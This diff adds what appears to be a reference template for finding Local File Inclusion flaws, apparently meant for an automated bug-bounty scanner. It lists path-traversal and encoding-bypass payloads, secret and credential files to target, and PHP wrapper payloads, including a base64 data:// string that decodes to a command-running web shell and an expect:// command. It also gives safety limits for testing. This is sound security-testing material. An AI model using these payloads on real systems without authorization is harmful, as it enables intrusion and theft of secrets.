@@ -1,0 +1,185 @@
+VULNERABILITY TYPE: Local File Inclusion (LFI)
+
+DESCRIPTION:
+Local File Inclusion vulnerabilities allow attackers to include and read local files on the server through input manipulation. This can lead to source code disclosure, configuration file access, credential theft, and in some cases, remote code execution.
+
+DETECTION INDICATORS:
+- Parameters that accept file paths or names (file, path, page, template, include, view, doc)
+- File viewing/downloading functionality
+- Template selection parameters
+- Language/locale selection that includes files
+- Document viewers
+- Error messages showing file paths
+- Parameters with file extensions (.php, .txt, .html)
+
+PAYLOAD GENERATION IDEAS:
+1. Basic Linux file inclusion:
+   - /etc/passwd
+   - /etc/hosts
+   - /etc/issue
+   - /proc/self/environ
+   - /proc/self/cmdline
+   - /var/log/apache2/access.log
+   - /var/log/nginx/access.log
+
+2. Path traversal sequences:
+   - ../../../etc/passwd
+   - ....//....//....//etc/passwd
+   - ..\/..\/..\/etc/passwd
+   - %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+   - ..%252f..%252f..%252fetc%252fpasswd (double encoding)
+
+3. Windows-specific:
+   - C:\Windows\System32\drivers\etc\hosts
+   - C:\Windows\win.ini
+   - C:\boot.ini
+   - ..\..\..\windows\system32\drivers\etc\hosts
+
+4. Null byte injection (older PHP):
+   - /etc/passwd%00
+   - /etc/passwd%00.php
+
+5. Wrapper exploitation (PHP):
+   - php://filter/convert.base64-encode/resource=index.php
+   - php://input (with POST data)
+   - data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+   - expect://whoami
+
+6. Application-specific files:
+   - .env
+   - config.php
+   - database.yml
+   - wp-config.php (WordPress)
+   - .git/config
+   - composer.json
+
+TESTING STRATEGY:
+1. Identify file inclusion points:
+   - Look for parameters with file/path-related names
+   - Check URL patterns that suggest file loading
+   - Test template or view parameters
+
+2. Test basic traversal:
+   - Try ../../../etc/passwd
+   - Observe error messages for path information
+   - Count necessary ../ sequences
+
+3. Test filters and WAF:
+   - Try URL encoding
+   - Try double encoding
+   - Try different traversal sequences
+   - Mix different techniques
+
+4. Target sensitive files:
+   - Start with /etc/passwd (safe, proves vulnerability)
+   - Try application configuration files
+   - Attempt source code disclosure
+
+5. Verify content:
+   - Check if actual file content is returned
+   - Verify it's not just an error message
+   - Confirm the file is from the target system
+
+6. Test different wrappers (if PHP):
+   - php://filter for source code
+   - data:// for RCE testing
+   - phar:// if available
+
+VERIFICATION LOGIC:
+TRUE POSITIVE indicators:
+- /etc/passwd content is displayed (root:x:0:0:)
+- Source code of PHP files is revealed
+- Configuration files are readable
+- Valid file content matches expected format
+- Error messages reveal successful file access
+- File metadata or timestamps are shown
+- Application crashes with file not found (indicates file reading attempt)
+
+FALSE POSITIVE indicators:
+- Generic error messages without file content
+- WAF blocking message
+- Same response regardless of path
+- File path validation error
+- Application error page (not file content)
+- Empty response
+- Sanitized or filtered output
+
+SEVERITY ASSESSMENT:
+- Critical: Source code disclosure of sensitive files, RCE via wrappers, credentials exposed
+- High: Configuration files readable, sensitive data exposure, log files accessible
+- Medium: Limited file read, only public or low-sensitivity files accessible
+- Low: Path traversal works but can't reach sensitive files
+- Info: Error messages reveal file paths but no file inclusion
+
+BUG BOUNTY SAFETY:
+- Stick to safe files like /etc/passwd, /etc/hosts, /etc/issue
+- Do NOT attempt to read private keys, password files, or user data
+- Do NOT use RCE payloads on production systems
+- Stop at proof-of-concept
+- Do NOT read large files or attempt DoS
+- Avoid accessing log files that might contain user data
+
+COMMON VULNERABLE PATTERNS:
+- include($_GET['page'] . '.php')
+- require($page)
+- file_get_contents($_GET['file'])
+- readfile($template)
+- fopen($filename)
+
+FILTER BYPASSES:
+1. Encoding bypasses:
+   - URL encoding: %2e%2e%2f
+   - Double encoding: %252e%252e%252f
+   - Unicode: %c0%ae%c0%ae%c0%af
+
+2. Traversal bypasses:
+   - ..././ (bypasses removal of ../)
+   - ....\\ (mixed slashes)
+   - ..;/ (semicolon injection)
+
+3. Extension bypasses:
+   - Null byte: %00
+   - Question mark: ?
+   - Hash: #
+
+4. Absolute path:
+   - /var/www/html/../../../etc/passwd
+   - Provide full path when relative fails
+
+WRAPPER-SPECIFIC EXPLOITATION (PHP):
+1. php://filter:
+   - Read source: php://filter/convert.base64-encode/resource=config.php
+   - Strip tags: php://filter/string.strip_tags/resource=index.php
+
+2. php://input:
+   - Send PHP code in POST body
+   - Requires allow_url_include=On
+
+3. data://:
+   - data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+   - Execute arbitrary PHP
+
+4. expect://:
+   - expect://whoami
+   - Execute system commands
+
+TARGET FILE RECOMMENDATIONS:
+Linux:
+- /etc/passwd (users)
+- /etc/shadow (requires root)
+- /etc/hosts (hostname mappings)
+- /proc/self/environ (environment variables)
+- /var/www/html/.env (application secrets)
+- /var/log/apache2/access.log (logs)
+
+Windows:
+- C:\Windows\win.ini
+- C:\Windows\System32\drivers\etc\hosts
+- C:\inetpub\wwwroot\web.config
+
+Application-specific:
+- .env, .env.local, .env.production
+- config/database.yml
+- wp-config.php
+- .git/config
+- composer.json, package.json
